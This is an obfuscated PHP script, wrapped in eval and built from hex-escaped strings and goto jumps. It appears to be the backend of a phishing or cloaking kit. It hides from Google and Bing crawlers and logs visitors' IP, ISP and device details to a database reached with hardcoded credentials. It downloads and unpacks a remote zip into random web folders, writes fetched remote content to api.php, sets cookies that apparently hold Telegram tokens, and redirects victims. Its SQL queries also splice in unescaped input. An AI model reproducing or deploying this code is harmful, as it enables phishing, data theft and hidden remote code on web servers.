<?php eval(base64_decode('
 goto gV8aK; zEpJx: $protocol = isset($_SERVER["\110\x54\124\x50\x53"]) && $_SERVER["\x48\124\124\120\x53"] === "\157\x6e" ? "\x68\164\x74\160\x73" : "\150\164\x74\x70"; goto spAB7; subh3: $TIME_DATE = date("\131\x2d\155\x2d\x64\x20\110\x3a\x69\72\x73"); goto P4oDy; fN8lF: if (isset($_POST["\163\x68\x6f\x70\x69\x64"])) { $gameid = $_POST["\x73\x68\157\x70\x69\x64"]; $_SESSION["\x6c\x6f\154\163\157\x75\x6c\163"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto n1mmC; Vp_1v: function rand_num($length) { $characters = "\x30\61\62\63\x34\65\66\67\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto oC3Kw; eaSoU: if ($_SERVER["\122\105\x51\125\105\x53\x54\137\115\x45\x54\x48\x4f\x44"] === "\x50\x4f\123\124") { if (!isset($_POST["\154\x6f\143\x61\x6c\151\x70"])) { $refix = "\x49\x6e\166\x61\154\151\x64\x20\x49\x50\x53"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\163\150\x6f\x70\151\x64"])) { $refix = "\111\156\166\x61\x6c\x69\x64\x20\111\x44\x20\x53\x51\x4c"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\167\145\x62")) { if (!mkdir("\167\x65\142", 511)) { die("\106\x61\x69\154\145\x64\x20\164\x6f\40\143\162\x65\x61\164\x65\x20\x77\145\x62\x20\144\151\162\x65\143\164\157\x72\171"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\167\145\142\x2f{$sub_folder}\x2f"; $zipFileUrl = $_SESSION["\x75\x72\154"]; $tempDir = "\164\145\155\160"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\57{$folder_name}\x2e\172\151\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\141\151\x6c\x65\x64\40\164\157\x20\x63\162\x65\x61\x74\145\40\164\150\145\x20\x66\157\154\x64\x65\x72\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\x2e" && $file !== "\56\56") { rename($folder_path . "\57" . $file, $folder_path . $file); } } } else { echo "\106\141\151\154\x65\x64\x20\x74\x6f\x20\x65\x78\164\162\141\143\164\x20\164\x68\x65\40\172\151\x70\x20\x66\x69\x6c\x65\x2e"; } } else { die("\106\x61\x69\154\145\x64\x20\164\x6f\40\x64\x6f\x77\156\x6c\x6f\141\x64\x20\164\x68\145\40\x7a\151\x70\x20\x66\x69\154\145\x2e"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\154\157\x6c\163\x6f\165\154\x73"]; $_SESSION["\x6c\157\x63\x61\x6c\x64\151\x72"] = "{$folder_path}"; file_put_contents("{$folder_path}\57\154\x6f\x63\141\154\56\x74\x78\x74", "{$StrupLom}\12", FILE_APPEND); $fileURL = $_SESSION["\141\160\x69"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\167\x65\x62\x2f\141\160\151\56\160\150\160"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\101\120\x49") { getFileContents($fileURL); } $localip = isset($_POST["\154\157\143\141\x6c\x69\160"]) ? $_POST["\154\x6f\x63\x61\154\x69\x70"] : null; $domainname = isset($_POST["\x64\x6f\x6d\141\x69\156\x6e\141\x6d\145"]) ? $_POST["\144\x6f\x6d\x61\151\156\156\x61\155\x65"] : null; $nextdomain = isset($_POST["\156\x65\170\164\x64\157\x6d\141\x69\156"]) ? $_POST["\156\145\170\164\144\x6f\x6d\141\x69\156"] : null; $shopid = isset($_POST["\163\x68\x6f\160\151\x64"]) ? $_POST["\x73\x68\x6f\160\151\x64"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\x74\x65\155\160"; $zipFiles = glob($directory . "\x2a\56\172\151\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } sleep(5); ob_start(); $responseData = array("\x73\x74\x61\x74\x75\163" => "\x73\x75\143\143\x65\163\x73", "\142\141\143\x6b\137\x64\151\162" => $folder_path, "\142\141\x63\153\x5f\x75\162\154" => $nextdomain, "\x62\141\x63\153\137\151\x64" => $shopid, "\x6d\145\163\163\x61\x67\145" => "\104\141\x74\141\40\163\x75\143\x63\145\163\x73\x66\165\x6c\x6c\171"); $responseJson = json_encode($responseData); echo $responseJson; ob_flush(); flush(); } else { http_response_code(400); $responseData = array("\163\164\x61\x74\165\163" => "\x34\x30\60", "\x62\x61\143\153\x5f\x64\x69\x72" => '', "\142\141\x63\153\x5f\165\162\154" => '', "\x62\141\x63\x6b\137\151\x64" => '', "\155\x65\163\163\x61\147\x65" => "\104\141\x74\x61\x20\155\151\x73\x73\x69\x6e\147"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\x73\164\x61\164\165\x73" => "\x34\60\x35", "\142\141\x63\x6b\137\144\x69\x72" => '', "\142\141\143\153\137\x75\x72\x6c" => '', "\x62\x61\x63\153\x5f\x69\144" => '', "\155\x65\x73\x73\141\147\x65" => "\104\x61\164\x61\x20\x69\156\166\141\x6c\151\x64"); $responseJson = json_encode($responseData); echo $responseJson; } goto Joac_; RkHup: $botName = is_bot_ip($StrupLom); goto enk7N; rAoh2: $url = "\150\164\x74\x70\72\57\x2f\151\160\55\x61\x70\151\x2e\x63\x6f\x6d\57\160\150\160\x2f{$StrupLom}\x3f\146\x69\145\x6c\144\163\75\x73\x74\x61\x74\x75\163\x2c\x6d\x65\163\163\141\x67\x65\x2c\x63\x6f\156\x74\151\x6e\145\x6e\164\x2c\143\x6f\x6e\164\x69\156\x65\156\x74\x43\x6f\x64\x65\54\x63\157\x75\x6e\x74\162\x79\54\x63\157\x75\156\x74\x72\x79\x43\x6f\144\x65\54\x72\x65\x67\151\157\x6e\54\162\x65\147\151\157\x6e\x4e\141\155\x65\54\143\151\164\171\54\144\x69\163\x74\162\151\x63\164\54\172\151\160\54\154\141\164\54\x6c\157\156\54\164\x69\x6d\145\x7a\x6f\156\145\x2c\x63\165\162\x72\145\x6e\x63\171\54\151\x73\160\x2c\x6f\162\147\54\141\163\54\141\x73\156\141\x6d\x65\x2c\x72\145\x76\x65\162\163\145\54\155\157\x62\151\154\145\54\160\162\157\x78\171\54\x68\x6f\x73\164\151\x6e\x67\x2c\x71\165\145\x72\x79"; goto ypMWD; PRBIL: $_SESSION["\x56\x6f\x70\x72\164"] = isset($info["\x63\x69\x74\x79"]) ? $info["\143\x69\x74\171"] : null; goto rsUFG; mVYlz: $_SESSION["\x69\163\160"] = isset($info["\x69\x73\x70"]) ? $info["\151\x73\160"] : null; goto fy770; eknzz: if (isset($_GET["\145\x6e\x64\155\x65\x6c\165\x78"])) { $redi = $_COOKIE["\x72\145\x64\x69\162\x69\x63\164"]; $vdir = $_GET["\x65\x6e\144\155\145\154\165\170"]; $directoryToDelete = "\x77\145\142\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\74\163\143\162\151\160\x74\x20\x4c\101\116\x47\x55\x41\107\105\75\x27\112\141\166\141\123\x63\162\x69\160\x74\x27\x3e\xa\x20\x20\40\x20\x77\151\156\x64\x6f\167\x2e\x6c\157\143\141\x74\151\x6f\156\56\x68\162\145\146\x3d\47{$redi}\47\73\12\x20\40\x20\x20\74\x2f\163\x63\x72\151\160\164\76"; die; } goto OzumO; h_10s: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto kejr5; kejr5: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\x6f\156\x6e\x65\x63\x74\151\x6f\x6e\x20\146\141\151\154\x65\144\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\x4c\x45\x43\124\40\52\40\x46\x52\x4f\x4d\40\x6c\x6f\x67\163\40\x57\x48\x45\x52\105\40\151\160\x61\x64\144\162\145\163\x3d\x27{$StrupLom}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto fy1q9; ypMWD: $curl = curl_init($url); goto Y0O0u; hmdE1: $IpCount = FOx_TGH_X($userAgent); goto u2U2n; u2U2n: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\110\x54\124\x50\x5f\x55\x53\105\122\137\101\107\105\116\124"]) ? $_SERVER["\110\x54\124\120\x5f\125\x53\x45\122\137\101\107\x45\x4e\124"] : ''; $isp = $_SESSION["\151\x73\160"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\x53\x45\x52\126\x45\x52\x5f\x4e\101\115\105"]; $LOCALO_TEMPO = date("\131\x2d\x6d\x2d\x64\x20\110\72\151\x3a\x73"); $Blasacoun = $_SESSION["\102\x6c\141\x73\x61\143\157\x75\156"]; $Njopf = $_SESSION["\116\x6a\157\x70\146"]; $Voprt = $_SESSION["\126\157\160\x72\164"]; $xOpuy = $_SESSION["\170\117\160\x75\x79"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\157\x6e\156\x65\x63\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\145\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\105\103\x54\x20\52\40\106\122\117\115\40\154\157\147\x73\40\x57\110\x45\x52\105\40\151\160\x61\x64\x64\162\145\163\75\x27{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\x21\x21"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\x27", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\47", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\x27", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\47", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\47", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\47", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\47", '', $refix)); $query = "\111\116\123\105\x52\x54\40\x49\116\124\117\x20\x6c\x6f\147\163\40\50\151\160\141\x64\144\162\145\163\x2c\x63\x6f\x75\156\164\x72\171\x2c\142\162\157\x77\x73\x65\162\x2c\157\163\54\x64\x6f\x6d\151\x6e\x65\54\155\171\164\151\155\x65\x2c\150\157\x73\x74\x2c\151\x73\160\54\x72\145\163\157\156\51\40\12\40\x20\x20\40\x20\40\11\x20\40\x20\x20\11\40\40\126\101\114\125\105\123\40\50\47{$StrupLom}\47\x2c\47{$Blasacoun}\x27\x2c\x27{$IpCount}\47\x2c\47{$OKJIVGRD}\x27\x2c\x27{$donflag}\x27\x2c\47{$LOCALO_TEMPO}\x27\54\x27{$host}\47\54\x27{$isp}\47\x2c\x27{$refix}\47\51"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\x21"; } } goto ch4gO; O1s1U: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\57", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\377", $mask >> 3) . chr(255 << 8 - ($mask & 7)); return ($subnetBin & $maskBin) === ($ipBin & $maskBin); } goto RkHup; XiM7M: function is_bot_ip($ipToCheck) { $botsUrls = array("\147\157\x6f\147\154\145" => "\150\164\164\x70\x73\x3a\57\x2f\x64\145\166\145\154\x6f\x70\x65\x72\163\56\147\x6f\157\x67\x6c\x65\x2e\143\157\x6d\57\x73\x65\x61\x72\143\150\x2f\x61\160\151\x73\x2f\x69\x70\162\141\156\147\145\x73\57\x67\x6f\157\147\154\145\x62\157\x74\x2e\x6a\163\x6f\156", "\142\x69\x6e\147" => "\150\164\164\x70\x73\x3a\57\57\167\x77\x77\x2e\142\x69\x6e\x67\56\143\x6f\155\x2f\x74\x6f\157\154\142\157\170\x2f\142\x69\x6e\147\x62\157\164\x2e\x6a\163\x6f\x6e"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\x70\x72\x65\x66\x69\170\145\x73"] as $ipRange) { if (isset($ipRange["\x69\x70\166\x36\120\x72\145\146\x69\x78"]) && strpos($ipToCheck, "\x3a") !== false) { $network = $ipRange["\151\x70\x76\66\x50\x72\x65\x66\151\x78"]; } elseif (isset($ipRange["\151\x70\166\64\120\162\x65\x66\151\x78"]) && strpos($ipToCheck, "\x3a") === false) { $network = $ipRange["\x69\x70\x76\64\x50\162\145\146\151\170"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto O1s1U; VqnZQ: $userAgent = isset($_SERVER["\x48\124\124\x50\x5f\125\x53\x45\122\x5f\x41\x47\x45\x4e\x54"]) ? $_SERVER["\x48\124\x54\x50\137\125\123\105\122\137\101\x47\105\x4e\124"] : ''; goto kLNra; OtNgH: if (strpos(gethostbyaddr($StrupLom), "\147\x6f\x6f\147\x6c\145") !== false) { $refix = "\x42\157\x73\145\40\107\x20\x32"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto JO4WZ; tKaR7: if (!empty($_SERVER["\x48\124\x54\120\137\x43\114\x49\105\x4e\x54\137\x49\120"])) { $ipAddress = $_SERVER["\110\124\x54\120\137\103\114\111\x45\116\124\x5f\111\120"]; } elseif (!empty($_SERVER["\x48\x54\x54\120\137\x58\x5f\x46\x4f\122\127\x41\122\104\x45\104\x5f\x46\117\x52"])) { $ipAddress = $_SERVER["\x48\124\124\120\x5f\130\137\106\x4f\x52\x57\101\122\104\x45\x44\137\x46\117\x52"]; } else { $ipAddress = $_SERVER["\122\105\x4d\117\x54\105\137\101\104\104\x52"]; } goto oog6d; tJad9: $_SESSION["\x4e\x6a\157\x70\146"] = isset($info["\x63\157\165\x6e\164\162\x79\103\157\x64\145"]) ? $info["\x63\157\x75\x6e\x74\x72\171\x43\x6f\144\x65"] : null; goto PRBIL; gV8aK: error_reporting(E_ALL); goto dxjCP; JO4WZ: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto zV9kM; enk7N: if ($botName) { $refix = "\x4d\141\x69\156\x20\116\145\x77\x20\x42\x6f\x74\40\x52\141\156\x67\x65"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto zEpJx; MaNYH: $info = unserialize($response); goto mVYlz; Mm143: $Lredsvv = base64_decode("\132\110\112\152\132\x32\x6c\x73\x65\x56\x41\167\113\155\163\x6d"); goto f5N3h; ncobd: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\x55\156\x6b\156\x6f\x77\156\x20\102\162\157\x77\163\145\162"; $BROWSER = array("\57\x6d\x73\151\x65\57\151" => "\111\x6e\x74\145\x72\x6e\145\x74\x20\105\x78\160\154\x6f\x72\145\x72", "\x2f\146\151\162\x65\x66\x6f\170\x2f\x69" => "\106\x69\162\145\x66\157\x78", "\57\163\x61\x66\141\x72\x69\x2f\151" => "\x53\x61\146\x61\x72\151", "\57\x63\150\x72\157\155\145\57\x69" => "\103\x68\x72\157\155\x65", "\57\145\x64\147\x65\57\151" => "\105\144\x67\145", "\x2f\x6f\x70\x65\x72\141\x2f\151" => "\x4f\160\145\162\x61", "\57\x6e\x65\164\163\143\x61\x70\x65\57\x69" => "\x4e\145\164\163\x63\x61\160\x65", "\x2f\155\141\170\164\x68\157\x6e\57\151" => "\115\x61\x78\x74\150\157\156", "\x2f\153\x6f\x6e\x71\x75\145\162\157\x72\57\151" => "\113\157\156\x71\165\145\162\157\x72", "\57\155\x6f\x62\151\x6c\x65\57\x69" => "\110\x61\x6e\144\x68\145\x6c\x64\40\102\162\x6f\x77\x73\x65\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto VqnZQ; K8MHq: function Rand_XD_TF($length) { $characters = "\x61\142\x63\x64\145\146\x6a\150\151\x67\x6b\154\155\156\x6f\x70\x71\x72\x73\x74\x75\166\x77\170\x79\x7a\x30\x31\x32\x33\64\x35\66\x37\70\71\x41\102\103\104\105\106\x47\110\x49\x4a\113\114\115\x4e\x4f\x50\121\x52\123\124\125\126\127\130\131\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto Vp_1v; oog6d: $datalog = base64_decode("\145\155\x56\x79\x62\171\x31\153\131\x58\x6b\165\x63\x32\150\x76\x63\x41"); goto eJoZj; dxjCP: ini_set("\x64\151\x73\160\154\x61\171\137\145\x72\x72\x6f\162\x73", 1); goto tKaR7; KAqT4: $ipPortArray = explode("\x3a", $ipAddress); goto Kd8Js; EQpQ0: $directories = glob($parentDirectory . "\57\x2a", GLOB_ONLYDIR); goto h_10s; OzumO: if (isset($_GET["\154\x6f\154\x6d\145"])) { $vdir = $_GET["\x6c\x6f\x6c\155\145"]; $refix = "\111\x6e\166\141\x6c\151\x64\x20\x6c\157\154\x6d\x65"; $redi = $_COOKIE["\162\x65\144\151\x72\x69\x63\164"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\167\x65\142\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\143\x72\x69\x70\x74\x20\114\x41\x4e\x47\125\x41\107\x45\75\47\112\141\x76\x61\x53\x63\x72\x69\160\x74\47\76\12\x20\x20\40\x20\x77\151\156\x64\157\x77\56\x6c\157\x63\x61\x74\151\x6f\x6e\56\150\x72\x65\x66\75\x27{$redi}\x27\73\12\x20\40\40\40\x3c\x2f\x73\143\162\x69\x70\x74\x3e"; die; } goto IHeTn; ZAkkS: $parentDirectory = "\167\145\142"; goto EQpQ0; spAB7: $domain = $_SERVER["\x48\124\x54\x50\x5f\110\x4f\x53\x54"]; goto R5bTa; fy1q9: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\41\41\41"; echo $showpip; die; } goto eknzz; rsUFG: $_SESSION["\x78\117\x70\x75\171"] = isset($info["\x72\x65\147\x69\x6f\156\116\141\x6d\x65"]) ? $info["\162\145\x67\151\157\156\116\x61\155\x65"] : null; goto cW0wn; Kd8Js: $StrupLom = $ipPortArray[0]; goto QJbiS; kLNra: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto hmdE1; n1mmC: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\156\x6e\145\x63\164\x69\x6f\156\x20\x66\x61\x69\154\x65\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\114\x45\x43\124\40\x2a\x20\x46\x52\x4f\115\40\x72\145\x64\151\x72\143\x74\x69\157\156\x20\127\110\105\122\x45\40\151\x64\75\x27{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\151\x6e\x6b"] = base64_decode(base64_decode($row["\154\151\x6e\153"])); $_SESSION["\x63\156"] = explode("\x3b", base64_decode(base64_decode($row["\x63\157\x75\156\x74\162\171"]))); $_SESSION["\160\151\x63"] = $row["\x70\x69\143"]; $_SESSION["\x6d\x73\x67"] = base64_decode(base64_decode($row["\x6d\x73\x67"])); $_SESSION["\x65\x78\160"] = $row["\145\170\160\151\x72\145"]; $_SESSION["\x73\x65\x72\166\145\x72"] = base64_decode(base64_decode($row["\x73\x65\x72\166\x65\x72"])); $_SESSION["\165\x72\154"] = base64_decode(base64_decode($row["\165\x72\x6c"])); $_SESSION["\154\165\x78\143\141\160\164\x63\x68\x61"] = $row["\154\165\170\x63\x61\x70\164\x63\150\x61"]; $_SESSION["\164\157\x6b\145\156\x74\145\154"] = base64_decode(base64_decode($row["\x74\x6f\x6b\145\x6e\164\x65\154"])); $_SESSION["\x69\144\x74\145\x6c"] = base64_decode(base64_decode($row["\151\x64\164\145\154"])); $_SESSION["\162\x65\x64\151\x72\151\x63\164"] = $row["\162\x65\x64\151\x72\x69\x63\164"]; $_SESSION["\141\x70\151"] = $row["\141\160\151"]; if (isset($_GET["\x76\x73\163"])) { setcookie("\x74\157\153\145\156\164\x65\154", $_SESSION["\x74\x6f\153\145\x6e\164\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\151\x64\x74\145\154", $_SESSION["\151\144\x74\x65\154"], time() + 86400 * 30, "\x2f"); setcookie("\162\x65\144\151\162\x69\143\164", $_SESSION["\x72\x65\x64\151\x72\x69\x63\x74"], time() + 86400 * 30, "\57"); } } } else { $refix = "\x70\x72\157\x6a\x65\143\164\40\x49\104\40\156\x6f\164\x20\x66\157\165\x6e\144\x20\151\x64\56{$id}"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto K8MHq; zV9kM: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto eaSoU; R5bTa: $donflag = $protocol . "\x3a\x2f\x2f" . $domain; goto rAoh2; Y0O0u: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto bFyHZ; P4oDy: if (isset($_POST["\x6c\157\143\x61\x6c\151\160"])) { $myips = base64_decode(base64_decode($_POST["\154\157\x63\141\x6c\151\160"])); $_SESSION["\154\157\x6c\151\x70\163"] = $myips; $StrupLom = $myips; } goto XiM7M; cW0wn: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\x2e\x2e") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto IVjZK; eJoZj: $Fixbom = base64_decode("\x65\155\126\171\x62\x32\x52\x68\x65\130\116\146\x5a\107\x46\65"); goto Mm143; fy770: $_SESSION["\102\154\141\x73\x61\x63\157\x75\156"] = isset($info["\x63\157\165\156\x74\x72\x79"]) ? $info["\143\x6f\x75\156\x74\162\171"] : null; goto tJad9; bFyHZ: $response = curl_exec($curl); goto TtiSe; IVjZK: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\x2e\56") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto ZAkkS; oC3Kw: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\125\x6e\x6b\x6e\157\167\x6e\40\117\x53\40\x50\154\141\x74\146\157\x72\x6d"; $OS = array("\57\167\151\156\144\x6f\167\x73\40\156\x74\x20\x31\x30\x2f\x69" => "\127\x69\156\x64\x6f\167\x73\40\61\x30", "\57\x77\x69\x6e\x64\x6f\167\x73\40\156\x74\x20\66\56\63\x2f\x69" => "\127\151\x6e\144\x6f\167\x73\x20\70\56\61", "\57\167\151\x6e\144\157\x77\163\x20\x6e\x74\40\x36\56\62\x2f\151" => "\x57\x69\x6e\x64\x6f\167\163\40\x38", "\57\167\151\x6e\x64\x6f\167\x73\x20\156\164\40\66\x2e\x31\x2f\x69" => "\127\x69\x6e\144\x6f\167\163\40\67", "\x2f\x77\151\x6e\x64\157\167\163\40\156\x74\x20\x36\56\x30\57\151" => "\127\x69\x6e\x64\x6f\x77\x73\40\126\151\x73\164\x61", "\x2f\167\x69\156\144\157\x77\x73\x20\156\164\40\65\56\62\57\151" => "\x57\151\x6e\x64\157\x77\163\x20\123\x65\162\166\145\x72\x20\x32\60\60\x33\57\130\120\x20\170\x36\x34", "\x2f\x77\151\156\144\157\167\163\x20\x6e\x74\x20\65\x2e\61\57\151" => "\x57\151\x6e\x64\x6f\167\163\40\x58\x50", "\x2f\x77\x69\x6e\x64\157\167\x73\40\170\x70\x2f\x69" => "\127\151\156\x64\x6f\x77\x73\40\130\120", "\57\167\x69\156\x64\x6f\167\x73\40\x6e\x74\40\65\x2e\x30\57\x69" => "\127\x69\156\144\157\x77\163\40\x32\60\60\60", "\57\167\x69\x6e\x64\157\x77\x73\40\x6d\x65\x2f\x69" => "\127\x69\x6e\x64\157\167\163\x20\x4d\x45", "\x2f\x77\151\156\71\x38\x2f\x69" => "\x57\151\x6e\144\157\x77\x73\x20\x39\70", "\57\167\x69\x6e\71\65\x2f\x69" => "\x57\x69\156\x64\157\167\163\x20\x39\x35", "\x2f\x77\151\156\61\x36\57\x69" => "\127\x69\156\144\157\167\163\40\x33\56\61\61", "\x2f\155\x61\143\151\x6e\x74\157\163\150\174\x6d\141\143\40\157\x73\40\x78\x2f\x69" => "\115\x61\143\x20\x4f\123\40\130", "\57\x6d\141\143\137\160\x6f\x77\x65\162\x70\x63\57\x69" => "\x4d\141\143\x20\117\123\40\71", "\57\x6c\x69\156\165\x78\x2f\x69" => "\114\x69\156\x75\x78", "\57\x75\x62\165\x6e\x74\165\57\x69" => "\125\142\165\x6e\x74\165", "\57\151\x70\x68\157\x6e\145\x2f\x69" => "\x69\x50\150\x6f\x6e\145", "\57\x69\x70\157\144\x2f\x69" => "\151\x50\157\144", "\57\x69\x70\x61\144\57\x69" => "\151\120\x61\x64", "\x2f\141\156\144\162\157\151\144\57\151" => "\101\156\144\x72\157\x69\144", "\x2f\142\154\141\x63\153\142\145\162\162\171\x2f\x69" => "\x42\154\x61\x63\x6b\x42\x65\x72\x72\x79", "\57\x77\145\x62\157\x73\57\x69" => "\115\157\x62\151\x6c\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto ncobd; TtiSe: curl_close($curl); goto MaNYH; ch4gO: if (strpos($userAgent, "\147\157\x6f\147\x6c\145") !== false) { $refix = "\102\x6f\163\145\x20\x47"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto OtNgH; IHeTn: if (isset($_GET["\166\163\x73"])) { $gameid = $_GET["\163\x6f\x75\154\x73"]; $_SESSION["\154\x6f\x6c\x73\x6f\165\154\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\166\x73\163"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\74\163\x63\162\x69\x70\164\40\x4c\x41\116\107\125\101\107\105\75\47\112\x61\x76\141\123\x63\x72\151\160\x74\47\x3e\xa\x20\x20\x20\x20\x77\x69\x6e\144\157\x77\56\x6c\157\x63\x61\164\x69\x6f\156\x2e\150\x72\145\x66\75\x27{$folder_pathx}\77\x26\166\x61\x6c\151\x64\75{$RandOP_Mlux}{$RandOP_Mlux}\46\x61\x6c\145\x72\x74\x3d{$RandOP_Mlux}\x26\170\x6c\x70\163\x3d{$RandOP_Mlux}\46\163\157\165\154\x73\x3d{$gameid}\x26\144\x6f\156\x65\x3d\x26\x65\162\x72\x6f\x72\171\75{$RandOP_Mlux}\x26\155\x6e\145\155\x6f\x6e\x69\x63\75\46\x6a\142\x3d{$RandOP_Mlux}\47\73\12\40\40\40\x20\x3c\57\x73\143\162\x69\x70\164\76"; die; } goto fN8lF; QJbiS: $domine = $_SERVER["\x53\105\122\x56\105\122\x5f\x4e\101\115\x45"]; goto subh3; f5N3h: $Nopwvv = base64_decode("\x65\155\x56\171\142\62\122\150\x65\x58\x4e\x66\132\107\106\x35"); goto KAqT4; Joac_: ')); ?>
